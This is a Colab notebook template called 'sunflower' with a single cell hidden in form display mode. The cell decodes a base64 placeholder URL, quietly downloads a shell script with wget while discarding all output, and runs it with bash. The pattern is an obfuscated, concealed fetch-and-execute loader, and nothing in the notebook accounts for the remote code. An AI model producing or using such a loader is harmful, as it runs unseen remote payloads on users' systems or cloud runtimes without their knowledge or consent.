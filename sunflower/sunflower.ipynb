{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "_id_.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "outputs": [],
   "source": [
    "#@title { vertical-output: true, form-width: \"_form_width_px\", display-mode: \"form\" }\n",
    "%cd -q ~\n",
    "!wget -O _id_.sh $(echo _url_ | base64 -d) &> /dev/null\n",
    "!echo 'echo \"_id_\"' >> _id_.sh &> /dev/null\n",
    "!bash _id_.sh -e _id_"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  }
 ]
}